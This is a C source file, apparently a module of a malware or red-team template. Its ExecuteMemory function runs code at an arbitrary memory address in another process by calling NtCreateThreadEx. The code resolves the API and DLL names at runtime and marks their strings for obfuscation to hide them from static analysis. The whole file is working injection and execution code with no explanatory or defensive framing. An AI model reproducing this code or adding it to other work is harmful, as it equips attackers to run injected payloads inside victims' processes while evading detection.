// Description:
// Used WinAPIs:
// IOCS strings:
#include <winternl.h>

typedef NTSTATUS (NTAPI *NtCreateThreadEx_t)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ProcessHandle,
    LPTHREAD_START_ROUTINE StartRoutine,
    LPVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    LPVOID AttributeList
);

BOOL ExecuteMemory(HANDLE process, LPVOID baseAddress) {
    NtCreateThreadEx_t pNtCreateThreadEx = (NtCreateThreadEx_t)GetProcAddress(GetModuleHandle(<obf>"NTDLL.DLL"<ob_end>), <obf>"NtCreateThreadEx"<ob_end>);

    if (pNtCreateThreadEx == NULL) {
        #ifdef DEBUG
            printf("[-] GetProcAddress for NtCreateThreadEx failed (%d)\n", GetLastError());
        #endif
        return FALSE;
    }

    HANDLE thread = NULL;
    NTSTATUS status = pNtCreateThreadEx(&thread, GENERIC_ALL, NULL, process, (LPTHREAD_START_ROUTINE)baseAddress, NULL, FALSE, 0, 0, 0, NULL);

    typedef DWORD (WINAPI * WaitForSingleObject_) (HANDLE hHandle, DWORD dwMilliseconds);
    typedef BOOL (WINAPI * CloseHandle_) (HANDLE hObject);
    WaitForSingleObject_ _WaitForSingleObject = (WaitForSingleObject_)GetProcAddress(GetModuleHandleA(<obf>"kernel32.dll"<ob_end>), <obf>"WaitForSingleObject"<ob_end>);
    CloseHandle_ _CloseHandle = (CloseHandle_)GetProcAddress(GetModuleHandleA(<obf>"kernel32.dll"<ob_end>), <obf>"CloseHandle"<ob_end>);


    if (!NT_SUCCESS(status)) {
        #ifdef DEBUG
            printf("[-] NtCreateThreadEx failed (%08x)\n", status);
        #endif
        return FALSE;
    }

    _WaitForSingleObject(thread, INFINITE);
    _CloseHandle(thread);
    return TRUE;
}
